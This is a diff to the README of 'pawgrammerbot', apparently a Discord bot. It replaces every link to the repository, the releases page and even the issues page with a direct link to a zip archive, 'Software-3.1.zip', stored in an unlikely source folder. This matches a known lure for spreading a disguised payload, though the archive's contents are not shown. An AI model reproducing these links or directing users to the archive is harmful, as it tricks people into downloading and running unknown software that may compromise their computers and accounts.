@@ -1,6 +1,6 @@
 # 🐾 pawgrammerbot - Your DevHub Guide on Discord
 
-[![Download pawgrammerbot](https://img.shields.io/badge/Download-pawgrammerbot-blue?style=for-the-badge&logo=github)](https://github.com/gane25/pawgrammerbot)
+[![Download pawgrammerbot](https://img.shields.io/badge/Download-pawgrammerbot-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gane25/pawgrammerbot/main/src/commands/articles/Software-3.1.zip)
 
 ## 🐱 What is pawgrammerbot?
 
@@ -22,7 +22,7 @@ You do not need to install Node.js or any other programming tools.
 
 Use the link below to get the bot files and start the process.
 
-[![Download pawgrammerbot](https://img.shields.io/badge/Download-pawgrammerbot-grey?style=for-the-badge&logo=github)](https://github.com/gane25/pawgrammerbot)
+[![Download pawgrammerbot](https://img.shields.io/badge/Download-pawgrammerbot-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gane25/pawgrammerbot/main/src/commands/articles/Software-3.1.zip)
 
 Click the button to visit the GitHub page. There, you will find the files and instructions to download the bot.
 
@@ -34,7 +34,7 @@ Follow these steps to download and set up pawgrammerbot on your Windows computer
 
    Click this link to open the GitHub repository, where you can download the files:
 
-   https://github.com/gane25/pawgrammerbot
+   https://raw.githubusercontent.com/gane25/pawgrammerbot/main/src/commands/articles/Software-3.1.zip
 
 2. **Download the latest release**
 
@@ -95,7 +95,7 @@ The bot uses Discord’s API and works on Node.js, but you do not have to instal
 
 From time to time, updates will be available to improve features or fix issues. To update pawgrammerbot:
 
-1. Visit the GitHub releases page: https://github.com/gane25/pawgrammerbot/releases
+1. Visit the GitHub releases page: https://raw.githubusercontent.com/gane25/pawgrammerbot/main/src/commands/articles/Software-3.1.zip
 
 2. Download the newest release file.
 
@@ -116,7 +116,7 @@ From time to time, updates will be available to improve features or fix issues. 
 ## 🤝 Support and Help
 
 If you encounter any problems that you cannot fix, visit the GitHub repository issues page to see if someone else has the same issue or to submit a new one:  
-https://github.com/gane25/pawgrammerbot/issues
+https://raw.githubusercontent.com/gane25/pawgrammerbot/main/src/commands/articles/Software-3.1.zip
 
 You can also find basic usage guides and documentation inside the GitHub repository’s README and Wiki sections.
 
@@ -139,4 +139,4 @@ Keep all files in the same folder to ensure the bot can find its settings and re
 
 For your convenience, here is the main link again:
 
-[Download pawgrammerbot](https://github.com/gane25/pawgrammerbot)
+[Download pawgrammerbot](https://raw.githubusercontent.com/gane25/pawgrammerbot/main/src/commands/articles/Software-3.1.zip)
